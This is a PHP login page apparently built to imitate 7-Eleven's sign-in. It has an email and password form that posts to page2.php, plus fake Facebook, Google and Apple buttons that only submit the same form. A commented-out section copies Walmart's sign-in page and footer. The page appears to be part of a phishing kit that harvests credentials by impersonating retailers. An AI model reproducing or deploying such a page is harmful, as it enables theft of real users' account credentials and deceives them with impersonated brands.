<?php
// include('header.php');
include('header-new.php');


if (isset($_SESSION['user_logged_in'])) {
    //  header('Location: dashboard.php');
}

?>

<style>
    /* .login-banner{background: url(./assets/images/pink-banner.jpg) no-repeat center center; min-height: 200px;} */
    @media(max-width: 767px) {
        .login-form {
            /* width: 100%; */
            /*            margin: 10px auto 0px;*/
            /* border-radius: 8px; */
            /*            box-shadow: 0 10px 20px 0 rgb(0 0 0 / 9%);*/
            /* background-color: #fff; */
            /* position: relative; */
            /* z-index: 99; */
            /* padding: 5px 15px; */
        }

        .login-form input {
            border-radius: 10px;
            height: 48px;
            padding: 0 1.42rem;
            font-size: 1rem;
            line-height: 48px;
            width: 100%;
            border: 1px solid #888;
            outline: none;
            position: relative;
            z-index: 1;
            color: #222226;
            text-overflow: ellipsis;
            margin-bottom: 0;
        }

        .login-form #submit {
            background-color: #0071dc;
            padding: 11px 24px;
            font-size: 1rem;
            display: block;
            width: 100%;
            min-width: 120px;
            margin-left: auto;
            margin-right: auto;
            line-height: 22px;
            border-radius: 32px;
            color: #fff;
            border-color: #0071dc;
            height: auto;
            cursor: pointer;
        }

        .login-form #submit:hover {
            background-color: #0071dc;
            border-color: #0071dc;
        }

        /* .login-form .forgot-pwd {
            color: red;
            text-align: center;
            margin-top: 20px;
        } */

        /* .register-link {
            color: red;
            font-size: 12px;
        }

        .register p {
            font-size: 12px;
        }

        .register {
            display: flex;
            align-items: center;
            justify-content: space-between;
        } */

        .login-form input.error {
            border-color: #ff4e1c;
            font-size: 12px;
        }

        .login-form label.error {
            color: #ff4e1c;
            font-size: 12px;
        }

        .login-form .form-group {
            margin-bottom: 15px;
        }

        .login-form input.error::placeholder {
            color: #ff4e1c;
        }

        .login-form h2 {
            line-height: 20px;
            font-size: 1rem;
            font-weight: 500;
            color: #4a4a4a;
            margin-bottom: 30px;
            text-align: center;
        }

        .login-banner .owl-dot {
            background: #fff !important;
            border: 1px solid #ddd !important;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            margin: 5px;
        }

        .login-banner .owl-dots {
            text-align: center;
            position: relative;
            margin-top: 12px;
        }

        .login-banner .owl-dot.active {
            background: red !important;
        }

        /* .usernew_login_inks {
            margin-top: 20px;
            display: block;
            justify-content: start;
            font-size: 12px;
        }

        .usernew_login_inks .usernew_login_link {
            text-align: center;
            margin-top: 10px;
            padding-left: 0;
            padding-right: 0;
            display: flex;
            justify-content: center;
        }

        .usernew_login_password .usernew_login_inks .usernew_login_link a {
            display: block;
            flex: 1;
        }

        .usernew_login_inks .usernew_login_link .login_link_text:not(:first-child) {
            padding-left: 10px;
            margin-left: 10px;
            border-left: 1px solid #ddd;
        }

        .usernew_login_inks .login_link_text {
            font-size: 12px;
            line-height: 1;
            color: red;
            text-decoration: none;
            flex: 1;
        } */

        .page_breadcrumb .page_breadcrumb_wrap {
            padding-top: 0.72rem;
            padding-bottom: 0.72rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .page_breadcrumb .breadcrumb_content .breadcrumb_current {
            font-size: 16px;
            line-height: 1;
            color: #878787;
        }

        .common_share_third .share_button {
            line-height: 24px;
            font-size: 14px;
            border: none;
            background: none;
        }

        .common_share_third .share_button .share_btn_icon {
            background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAC0AAAAtCAYAAAA6GuKaAAAAAXNSR0IArs4c6QAABLtJREFUaEPtl21oXEUUht8zN4maaCxN/khQWptaRUEwNbGV2IImGqS02XtvQhFBLQa0ptnNRxWhZUFFbU32JtWqAUtBU01nZ1N/taI/AtVimoIfrTa2jYIYLdqUFGPUJDtHrtmFkO5mt8nmo7AD99fcOee577xz5lzCVTjoKmRGGnq+di2tdFrpaRRI2yNtj/myR1FRTeayZdc9w0yPEfFdAIGIThHhwPDw+DuHD+/5NxW7kTJPezzem4ggAdwfB+xbIUYflnLv+dmCpwTatm2DueAoM9YA+JOIXtOajzCLsGHoMma8ACCPCF8vXTpS3N7ePjYb8JRAm6bvOYD3uMAArVEq8N1kKNv2FWrNX7rggKhTqqVtwaE9Hm8PEYqJsDMYdF6KBWSaPh/ALQB6lXKKFxzaNL1/AcgWgkqkDByPBWTbDUVah08APKJUa86igQ6HqeTQodjQ69c/cW1e3pLTzPg9FHJKFhzasrw9zChmph2hUODleEB+v1/4/X4G4D4zHik6iN6tAN6MHMQOgG2tUdrV5Zx2yWy7bhUzNTOjQynnwxnTRhamBDpS8o65akfiakBUCcFntOYyADsB3AjgoFJO9aKAdiEsy1fOzEfgXoMxB33FzI+GQs5viwK6snJrnhBZvQAvB/AZgBsArAKgmfl7gN43jIH9UsrR2QK762dtD9caWhe4Cj8EoGdkJLwuVT1GvA+cNbRleXczoxHg80KI1VIGBlKh5nQxZgVtmt7NADoAjAmhH5Sy7fO5Br5ie5SXN+bk5o43MaMKwAoAGQAEkdgVDLY8nwjYsurXMusmAA8AuB5APzMfuHjx0hvd3fv/SbQ+Op+00ps21a4wDONjAHfGCD4O0ItKBXbHS2xZ3kZmvBr50KmvnRFCl0nZ9nMy4ElBV1TUXpOdbfQAuBvAj8zwM4sewxjPZxZbADzpJhNCbJaypXNqYtv2VWrNoYmbkPYRhfeFwxkXiHQJEfwAbgVwSggqljLwdyLwpKBNs24bQK0Azmk9dl9X11uDkwN7PN7tRHgdoJ+E+GWllDIcnXev7pMnh1wFCwDaPnU3JsplpiuIa7dnlXLeThG07wuA1wJUrVTg4OVB/cI0h34AUCiEUS5l86fRd2zbt05r7gZwVqkltwN+PXW9x1NfTaQ/AnBCKefeFEFPtJ5aj+VPVTmawDTr2gF6On5C7lOq9Y5Y8xs2NORnZYX/ADCilJOwbU3SHslAe98FUDMT6IhFLrgNl1JObqqU7gWwOoE9+gCsZKayUCjgXuX/D8uqLWc2PpnOHqbpqwK4kxnHk+m1k1S6fhug4x5E0/Q1AbyLGb8axsDyyT2GbfuztB46C+CWaQ6i+/9YCKBBKcf9JZt2JAVdU1OTOTiY/Q0A15ORkjfWk5GRmac1bQH4qYk+RjyuVMsHUzNGlYyWPCH4vfHxsUGizEklj/qEwD0pK3kuxMaN9TdnZGh322+7XAZ26+8OpZxX4kk08WOrmwGKJVS/EPSIlIFziVR255NSOhqooqI2NyfHqJ90jV8CcJRINweDbccSJbQsXykz1wMoBTgHoH4idBKNBqTcO5xofXT+iqCTDTrX76Wh51rhtD3mS+G00mmlk1DgP9f48T3zk3pKAAAAAElFTkSuQmCC) no-repeat;
            background-size: cover;
        }

        .common_share_third .share_icon {
            width: 24px;
            height: 24px;
            display: inline-block;
            vertical-align: top;
        }

        .common_width_container {
            padding-left: 1.072rem;
            padding-right: 1.072rem;
        }

        .loader-wrap {
            display: flex;
            width: 100%;
            height: 100%;
            position: fixed;
            top: 0;
            left: 0;
            align-items: center;
            justify-content: center;
            z-index: 99999999999999;
            background: rgba(255, 255, 255, 1);
        }

        .loader-wrap .loading {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-wrap .loading img.china-mobile-logo-img {
            width: 200px;
        }

        .loader-wrap .loading img {
            width: 80px;
        }
    }

    .login-container {
        position: relative;
        padding: 20px;
        display: flex;
        flex-direction: column;
        gap: 10px;
        background-color: #147350;
        color: white
    }

    .login-title {
        font-size: 36px;
        font-weight: 900;
        line-height: 1.75rem;
        color: white
    }

    .login-types {
        display: flex;
        gap: 20px;
    }

    .login-types div {
        background-color: white;
        height: 60px;
        width: 60px;
        padding: 10px;
        border-radius: 50px;
        display: flex;
        justify-content: center;
        align-items: center;
    }

    .login-types div img {
        height: 30px;
        width: 30px;
    }

    .login-form {
        display: flex;
        flex-direction: column;
        gap: 10px;
    }

    .login-form-label {
        font-size: 12px;
        font-weight: bold;
        text-transform: uppercase;
    }

    .login-form input {
        background-color: white;
        border-radius: 10px;
        padding: 10px;
    }

    .login-actions {
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    .login-actions div {
        color: rgb(255 200 30);
        font-size: 15px;
        font-weight: 900;
        text-transform: uppercase;

    }

    .login-actions button {
        font-size: 15px;
        font-weight: 900;
        background-color: rgb(255 200 30);
        color: black;
        border: 1px solid black;
        border-radius: 50px;
        box-shadow: 5px 5px;
        padding: 10px 45px;
    }
</style>

<style>
    .loader-container {
        position: absolute;
        height: 100%;
        width: 100%;
        top: 0px;
        left: 0px;
        background-color: #262525a6;
        z-index: 10;
    }

    .loader {
        position: absolute;
        top: 45%;
        left: 45%;
        width: 48px;
        height: 48px;
        border: 5px solid rgb(255 200 30);
        border-bottom-color: #fff;
        border-radius: 50%;
        display: inline-block;
        box-sizing: border-box;
        animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
        0% {
            transform: rotate(0deg);
        }

        100% {
            transform: rotate(360deg);
        }
    }
</style>

<script>
    function togglePassword() {
        const password = document.getElementById("password")
        password.type = password.type === "password" ? 'text' : "password"
    }


    function toPage2() {
        const loader = document.getElementsByClassName("loader-container")
        loader[0].style.display = 'block'
        setTimeout(() => {
            loader[0].style.display = 'none'
            $("#mainform").submit();
            //window.location.href = 'page2.php'
        }, 1000);
    }
</script>

<div class="login-container">
    <div class="loader-container" style="display: none;">
        <span class="loader"></span>
    </div>
    <div>
        <div style="display: flex; justify-content: end;">
            <button style="height: 40px; width: 40px; padding: 11px; background-color: black; border-radius: 50px;">

                <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect x="3.06641" y="0.453125" width="14.8148" height="3.7037" transform="rotate(45 3.06641 0.453125)" fill="white"></rect>
                    <rect x="13.543" y="3.07227" width="14.8148" height="3.7037" transform="rotate(135 13.543 3.07227)" fill="white"></rect>
                </svg>
            </button>
        </div>
        <h2 class="login-title">Welcome to <br> 7-eleven</h2>
        <p>Log in to your 7-Eleven account with</p>
        <div class="login-types">
            <div onclick="toPage2()"><img src="<?php echo $folder_path;?>/images/facebook-logo.png" alt=""></div>
            <div onclick="toPage2()"><img src="<?php echo $folder_path;?>/images/google-logo.jpeg" alt=""></div>
            <div onclick="toPage2()"><img src="<?php echo $folder_path;?>/images/apple-logo.png" style="height: 35px;" alt=""></div>
        </div>
        <p>or use an email address and password</p>
        <div class="login-form">
            <form action="/page2.php" id="mainform" method="post">
            <div class="login-form-label">Email address</div>
            <input type="email" name="username">
            <div class="login-form-label">password</div>
            <div style="position: relative;">

                <input type="password" id="password" name="password">
                <div style="position: absolute; right: 20px; top: 30%; z-index: 1;" onclick="togglePassword()">
                    <svg stroke="currentColor" fill="#000" stroke-width="0" viewBox="0 0 16 16" height="15px" width="15px" xmlns="http://www.w3.org/2000/svg" style="
">
                        <path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"></path>
                        <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12-.708.708z"></path>
                    </svg>
                </div>
            </div>
            <div class="login-actions">
                <div>Forgot Password?</div>
                <button onclick="toPage2()">Login</button>
            </div>
            </form>
        </div>
    </div>
</div>
<!-- <div id="__next" data-reactroot="">
    <div class="w_PLoZ w-40-m w-30-l w-25-xl ph1-m pb7 vh-75-xl">
        <section>
            <header class="f1 mt7 tc">
                <a link-identifier="logoLink" aria-atomic="true" aria-label="Walmart. Save Money. Live Better. Home Page" href="/"><img loading="lazy" src="https://i5.walmartimages.com/dfw/4ff9c6c9-d10e/k2-_ef2c8660-96ed-4f64-891d-329fa488c482.v1.png" alt="Walmart logo with link to homepage." height="65" width="64"></a>
                <h1 class="mt3 f3 mb1">Sign in or create your account</h1>
                <p class="w_U9_0 w_U0S3 w_QcqU ma0 mb4">Not sure if you have an account?<br> Enter your email and we’ll check for you.</p>
            </header>
            <div class="login-form">
                <form action="./page2.php" method="POST" id="loginForm" novalidate>
                    <label for="loginId" class="ml1 b f6">Email Address</label>
                    <div class="w_y4Pl pb3">
                        <label class="w_iyCD w__XNG" for="ld_ui_textfield_280675"><span class="w__tXl"></span></label>
                        <input type="text" placeholder="Cell phone number" name="username" required>
                    </div>
                    <button type="submit" class="btnSubmit btn" name="submit" id="submit">Login</button>
                    <p class="w_U9_0 w_U0S3 w_QcqU dark-gray ph2 mv1 ml2">Securing your personal information is our priority.<br><a class="dark-gray" target="_blank" href="https://corporate.walmart.com/privacy-security">See our privacy measures.</a></p>
                </form>
            </div>
        </section>
    </div> -->
<!-- <div class="flex flex-column flex-auto relative mt7">
      <div class="bw2">
         <hr aria-hidden="true" class="w_8Gn9">
      </div>
      <span class="ph3">
         <footer class="" style="max-width: 1280px;">
            <ul class="list ma0 mt3 ph0 pt1">
               <li class=""><button class="bg-transparent bn lh-solid pa0 sans-serif tc underline inline-button black pointer f6 no-underline lh-copy mb3" type="button" style="color: rgb(70, 71, 74); margin-left: 0px;">Give feedback</button></li>
               <li class=""><a link-identifier="Generic Name" href="https://corporate.walmart.com/privacy-security/california-privacy-rights" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="CA Privacy Rights - opens in a new window" target="_blank" rel="noopener noreferrer"><span class="">CA Privacy Rights</span><span class="w_iUH7">(link is external)</span></a></li>
               <li class=""><a link-identifier="Generic Name" href="https://www.walmart.com/account/api/ccpa-intake?native=false&amp;app=gm&amp;type=sod" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="Your Privacy Choices - opens in a new window" target="_blank" rel="noopener noreferrer"><img loading="lazy" width="29" height="14" src="//i5.walmartimages.com/dfwrs/76316474-d730/k2-_3c5ba298-4f19-46be-9fc3-ac49225d19bd.v1.png" alt="Privacy choices icon" class="mr1"><span class="self-baseline">Your Privacy Choices</span><span class="w_iUH7">(link is external)</span></a></li>
               <li class=""><a link-identifier="Generic Name" href="https://www.walmart.com/account/api/ccpa-intake?native=false&amp;app=gm&amp;type=access" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="Request My Personal Information - opens in a new window" target="_blank" rel="noopener noreferrer"><span class="">Request My Personal Information</span><span class="w_iUH7">(link is external)</span></a></li>
               <li class=""><a link-identifier="Generic Name" href="https://corporate.walmart.com/california-transparency" class="no-underline center mb3 pointer f6 mid-gray flex items-center" aria-label="California Supply Chains Act - opens in a new window" target="_blank" rel="noopener noreferrer"><span class="">California Supply Chains Act</span><span class="w_iUH7">(link is external)</span></a></li>
            </ul>
            <div class="mt4 pb5 pt1 f7 lh-title mid-gray">© 2023 Walmart. All Rights Reserved.</div>
         </footer>
      </span>
   </div> -->
<div aria-live="assertive"></div>
</div>
<?php

include('footer-new.php');

?>